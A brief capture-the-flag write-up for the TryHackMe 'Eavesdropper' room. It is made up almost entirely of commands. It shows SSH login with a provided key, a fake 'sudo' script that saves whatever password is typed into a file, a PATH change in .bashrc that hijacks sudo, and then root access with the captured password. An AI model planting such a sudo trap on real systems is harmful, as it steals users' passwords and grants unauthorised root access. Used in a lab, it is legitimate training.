# Eavesdropper

[Eavesdropper](https://tryhackme.com/room/eavesdropper)

## Solution

- nmap scan: 22

```console
chmod 600 id_rsa
ssh -i id_rsa frank@$IP
```

```console
mkdir -p /home/frank/.local/bin/
vim /home/frank/.local/bin/sudo
```

```bash
#!/bin/bash
read password
echo $password >> /home/frank/password.txt
```

```bash
chmod +x /home/frank/.local/bin/sudo
vim /home/frank/.bashrc
```

```.bashrc
export PATH=/home/frank/.local/bin
...
```

```console
cat /home/frank/password.txt
```

```console
/bin/sudo bash
cat /root/flag.txt
```
